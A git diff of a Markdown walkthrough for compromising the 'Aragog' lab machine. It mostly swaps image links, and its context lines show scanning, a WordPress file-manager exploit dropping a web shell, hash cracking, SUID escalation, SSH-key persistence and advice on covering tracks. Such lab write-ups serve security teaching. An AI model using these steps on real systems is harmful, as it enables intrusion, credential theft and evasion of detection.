@@ -31,7 +31,7 @@ We will check if the machine is active or if there is a firewall blocking ICMP t
 ```
 ping -c 1 IP_OF_THE_ARAGOG
 ```
-![tercera cap_ping](https://github.com/Vicctoriaa/VISMA/assets/153718557/a16ed55c-d8de-43e8-aeab-ed765bd07e2c)
+![3 cap_ping](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/16e0697a-15a9-4ac6-951e-28d930a94ae0)
 
 Once we have sent a ping, we can check that the machine is on, we also see that the ttl = 64 so it is a Linux machine, if the ttl is “=” or less than 64 it means that we are probably facing a Linux machine.
 We can also observe that no packet has been discarded, so we already know that it is in the same network segment and is ready to be compromised.
@@ -40,51 +40,51 @@ Once we have that information, we will have to do a port scan. For this we will 
 ```
 nmap -sS -p --open -T5 --min-rate 5000 IP_DE_LA_ARAGOG -n -Pn -vvv -oG
 ```
-![4 cap_nmap1](https://github.com/Vicctoriaa/VISMA/assets/153718557/9f0cecac-277b-46ab-96c7-0a7fdd210233)
+![4 cap_nmap1](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/5983bfff-cc8d-4bf3-acb2-c14af734de18)
 
 Once we have finished with the port scan, we must now detect which services or versions are running on these ports. To do this, once we have the open ports copied to the clipboard
 ```
 nmap -sCV -p22,80 IP_DE_LA_ARAGOG -oN portServices
 ```
-![5 cap_nmap2](https://github.com/Vicctoriaa/VISMA/assets/153718557/801bb9f3-6416-44bd-a619-4440f6e2bd8a)
+![5 cap_nmap2](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/3c267b49-8f51-4bd2-95a3-217563461edb)
 
 Once the scan is done we find that port 22 is running ssh, but since we do not have any key at the moment we cannot do anything and a brute force attack would take a long time, so we leave it as the last option. We find that Apache is running on port 80, which means that there is a website running behind it.
 
 If we look for the IP of the machine with port 80 we find the following
 
-![6 cap_ipnavegadorWEB](https://github.com/Vicctoriaa/VISMA/assets/153718557/7f000f25-3155-43a7-8403-493871ef5ca3)
+![6 cap_ipnavegadorWEB](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/1ffcfab5-f45c-4c4f-b9e3-0267088aba5e)
 
 At first we don't see anything that catches our attention so let's look at the source code to see if there is anything interesting, to do this we will click on ctrl + u
 
-![7 cap_ctrl_U_web](https://github.com/Vicctoriaa/VISMA/assets/153718557/1aee44e7-258b-4fa8-8144-20a09f3a22a8)
+![7 cap_ctrl_U_web](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/a909a734-ee9a-4208-8fdf-ffaba09c0b39)
 
 And we found nothing. The next thing to test would be the subdomains, but here we do not have a domain or DNS server to ask the possible subdomains or subdomains indexed by the SSL certificate. So we will do fuzzing, this will help us determine if there is a hidden directory within the web server. To do this we will use `gobuster`, although we can also use tools like `fuff` or `wfuzz`.
 (In case it is not installed you can see how it is installed here......and to know what each parameter is, go here......)
 ```
 gobuster dir -u http://IP_DE_LA_ARAGOG:80 -w /usr/share/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x html,php,jpg,png,png,txt,docx,pdf 2>/dev/null
 ```
-![8 cap_gobuster1](https://github.com/Vicctoriaa/VISMA/assets/153718557/36899e51-7b8a-491c-96d1-059992d80b2d)
+![8 cap_gobuster1](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/9462f66e-30f1-42dd-ab22-eb7f2850c7b3)
 
 Once the scan is finished we find that the directory “/blog” and “/javascript” redirect us elsewhere while “/server-status” returns a 403 (the server receives the request but denies access to the action), yes We enter the java script, it will give us an error called FORBIDDEN, however if we enter the blog we see the website
 
-![9 cap_web blog](https://github.com/Vicctoriaa/VISMA/assets/153718557/30f6ed9f-d43e-412f-b8f2-8c3b7a7ff6cf)
+![9 cap_web blog](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/3af2c0c0-384a-4e21-a6db-bb0a24343712)
 
 We can see that it is a Wordpress[^1] page, but for some reason the website is not loading the “css”[^2] styles, so first we are going to review the source code.
 First, looking for comments from a developer that gives us valuable information and then we will search the "head" to see what happens and why it does not call the CSS style correctly, as we did previously, ctrl + u
 
-![10 cap_CSS](https://github.com/Vicctoriaa/VISMA/assets/153718557/aff25656-3d4f-40ba-9d19-e90a5d6bd107)
+![10 cap_CSS](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/8e25c874-fc9e-4951-aadd-ce0bfb141e4c)
 
 Since it calls the styles from a domain, in order to resolve it we must add the domain wordpress.aragog.hogwarts and aragog.hogwarts, so that our PC is able to resolve the domain, in the following directory:
 ```
 sudo nano /etc/hosts
 ```
-![11 cap_poner dominio CSS](https://github.com/Vicctoriaa/VISMA/assets/153718557/7465ef38-2401-4c8a-ba4b-d621605aa587)
+![11 cap_poner dominio CSS](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/c0cb7bd3-0350-4af5-9c2a-0078999d79ef)
 
 Now if we search for the domain “wordpress.aragog.hogwarts” in the browser, the website will appear correctly.
 
 This is what wappalyzer[^3] reports to us on the web
 
-![12_wappalyzer](https://github.com/Vicctoriaa/VISMA/assets/153718557/d465f016-a542-4141-a915-3378df7a6d5a)
+![12_wappalyzer](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/44d704a4-e29c-42e6-be27-6d605858113b)
 
 We can see that this page has wordpress, if we try to enter the “wp-content” directory
 ```
@@ -122,7 +122,7 @@ python3 2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog/
 ```
 If we enter the url: `http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php` It will not show us anything since we have to put a command at the end of the link adding it to the end of the url `cmd=COMMAND_WE_WANT`
 
-![13 cap_cmdURL](https://github.com/Vicctoriaa/VISMA/assets/153718557/ae1e931c-e063-453a-8bf3-98313735ba11)
+![13 cap_cmdURL](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/7f8d686a-65c0-4013-8093-b3d88d91e707)
 > This example shows the command `hostname -l` that tells us the IP
 
 Once we have verified that it has 2 network interfaces we are going to initiate a reverse shell.
@@ -162,7 +162,7 @@ echo “texto en base 64” | base64 -d; echo
 ```
 > The -d is to decode it and the final fact is to reset the output.
 
-![14 cap_hagrid](https://github.com/Vicctoriaa/VISMA/assets/153718557/115ac27c-5cd2-4c13-a780-3ba85437b622)
+![14 cap_hagrid](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/0d66a48f-a901-448b-9a37-05500d453f98)
 
 We will search if we find something useful, since Apache is running we must look for the Apache directory that `“/etc/apache2”` once inside we find that there is a directory called `“sites-enabled”` we enter and inside there is a wordpress.conf, When doing a `cat` it reveals that the directory where the wordpress is mounted is `“/usr/share/wordpress”`. If we enter, we find that there is an interesting directory called `“wp-content”`, if we enter and go to in `plugins>wp-file-manager>lib>files` we find our `payload.php`, for now we will not delete it because without it we cannot have the reverse Shell, but once we scale and have an ssh connection we must delete it to leave less evidence.
 ```
@@ -247,14 +247,14 @@ require_once(ABSPATH . 'wp-settings.php');
 We observe that the file names `“/etc/wordpress/config-default.php"`, what we will do is investigate it as we are not sure what it contains and we do not want to lose anything, use the command `pushd /etc/wordpress/ `[^6]
 When we do this we find the htacces file, which is the one that does not allow us to have directory listing on the web, and the file we came from called “config-default.php”. If we do a cat we find that we have some credentials.
 
-![15 cap_pushd](https://github.com/Vicctoriaa/VISMA/assets/153718557/8b78bad0-26d6-467f-b2b6-b12b9fa37dbb)
+![15 cap_pushd](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/241afe75-2f7e-42a9-a6b4-e7b94341c394)
 > Normally in WordPress a file called wp-config.php is used to configure the database with the entries. You also configure the cache, email language, session cookies...
 
 In this case, since it is another config file, I assume that it is the password for a database, we will start with the most typical `mysql` and to find out if it exists we will simply do a `ps aux`[^7] and filter by `mysql`
 ```
 ps aux | grep mysql
 ```
-![16 cap_ps aux](https://github.com/Vicctoriaa/VISMA/assets/153718557/3ead897c-62f3-48ef-a99c-40677d2127ff)
+![16 cap_ps aux](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/aad1feb6-aa5f-4c18-bb4f-18fe69dd298e)
 
 In this case we find that we are facing mysql so we are going to try to log in
 
@@ -265,13 +265,17 @@ mysql -uroot -p
 ```
 Once logged in we are going to see what databases we have, using the `show databases;` command, we enter the WordPress database since the site is set up in WordPress, executing `show tables;`.
 
-![17 cap_mariaDB](https://github.com/Vicctoriaa/VISMA/assets/153718557/332649f9-ecf9-4ee9-8d9b-8ab566697c45)
+![17 cap_mariaDB](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/e314af1a-61b6-4298-a100-317470cdfd8f)
+
+Within this we have several tables, we are going to enter the wp_users table, if we do a `describe wp_users` to see its columns we obtain the following:
+
+![18 cap_mariaUsers](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/baad0e15-7417-4b36-bc72-12d5d78f61c6)
 
 We'll list what's inside.
 ```
 select * form wp_users;
 ```
-![19 cap_select USERS](https://github.com/Vicctoriaa/VISMA/assets/153718557/079c0c24-35fe-4f4f-a25a-ceb3aa398ac7)
+![19 cap_select USERS](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/a7ab6213-8d39-4419-aa0c-ef2e83eddc68)
 
 If we look closely we see that the password of the user hagrid98 is hashed, we know this since it begins with a `$P$` since it is a characteristic format of systems such as PHP and WordPress. We will try to take it to the `/Resources/Credentials` directory and put it in a file called `hash`.
 ```
@@ -288,13 +292,13 @@ Once inside we are going to use a tool called `john` next to the `rockyou` dicti
 ```
 john -w:/usr/share/wordlists/rockyou.txt hash
 ```
-![20 cap_john1](https://github.com/Vicctoriaa/VISMA/assets/153718557/5c6498e2-d327-4a7b-90bc-bf3905c418af)
+![20 cap_john1](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/edd7a3c8-ef2e-4892-b454-6d05b1e1cf40)
 
 We can see that the john tool has found us hagrid98's password, which is password123. Once we have the username and password we will try to connect via `ssh`.
 ```
 ssh hagrid98@IP_DE_LA_ARAGOG
 ```
-![21 cap_ssh](https://github.com/Vicctoriaa/VISMA/assets/153718557/cc633ec1-71ca-4d77-9df2-333588451661)
+![21 cap_ssh](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/f1830675-9a16-4c7b-b693-4b91f3fd8f05)
 > We see that it allows us to connect, it is important to enter the password that we found previously and not that of our machine.
 
 # 3. Privilege escalation
@@ -318,7 +322,7 @@ watch -n 1 ls -l
 ```
 We see that if it is in root, knowing that we already have the path with SUID permissions, we execute `bash -p`, it will allow us to execute bash as the owner. We observe the following:
 
-![22 cap_bash-p](https://github.com/Vicctoriaa/VISMA/assets/153718557/b049e072-6e8f-4ff9-abe1-7507f4eb3025)
+![22 cap_bash-p](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/6e481c99-84b9-4c23-9e22-18bb6c2ea985)
 
 If we open the last flag we see, with the command `cat horcrux2.txt` it congratulates us 😊👍
 Since we have managed to completely violate the maqona. If we want to enter as many times as we want without a password, we explain it in the next point.
@@ -339,11 +343,11 @@ cat /root/.ssh/id_rsa.pub | tr '\\n' | xclip -sel clip
 ```
 We open a file called ".ssh/authorized_keys" with nano and paste the key (victim machine)
 
-![23 cap_pegarCLAVE](https://github.com/Vicctoriaa/VISMA/assets/153718557/b7d5fb2c-3a21-41d6-87fc-da0d04ac55b5)
+![23 cap_pegarCLAVE](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/9481b114-d01b-449e-b424-c800e8d2bcfd)
 
 We already have access, we can connect as root@IP_OF_THE_ARAGOG
 
-![24 cap_finalCLAVE](https://github.com/Vicctoriaa/VISMA/assets/153718557/21b00eaf-6cbe-439b-adb2-7dd81facbbdd)
+![24 cap_finalCLAVE](https://github.com/Vicctoriaa/VISMA.en/assets/153718557/47124fe9-a152-4eab-b3c2-5aa971af388e)
 
 > [!CAUTION]
 > If you are afraid of spiders, any phobia, seeing a spider/taratula may affect you in some way, do not download this text any further, since the machine refers to the Harry Potter spider.
